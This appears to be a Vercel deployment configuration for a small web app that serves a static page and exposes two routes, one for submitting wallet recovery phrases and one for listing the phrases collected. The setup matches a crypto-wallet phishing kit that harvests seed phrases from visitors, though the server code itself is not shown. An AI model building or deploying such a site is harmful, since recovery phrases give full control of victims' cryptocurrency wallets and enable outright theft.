{
  "version": 2,
  "builds": [
    {
      "src": "server.js",
      "use": "@vercel/node"
    },
    {
      "src": "index.html",
      "use": "@vercel/static"
    },
    {
      "src": "styles.css",
      "use": "@vercel/static"
    },
    {
      "src": "yi83ya3a.png",
      "use": "@vercel/static"
    }
  ],
  "routes": [
    {
      "src": "/",
      "dest": "/index.html"
    },
    {
      "src": "/styles.css",
      "dest": "/styles.css"
    },
    {
      "src": "/yi83ya3a.png",
      "dest": "/yi83ya3a.png"
    },
    {
      "src": "/submit-recovery-phrase",
      "dest": "/api/submit-recovery-phrase"
    },
    {
      "src": "/recovery-phrases",
      "dest": "/api/recovery-phrases"
    }
  ]
}
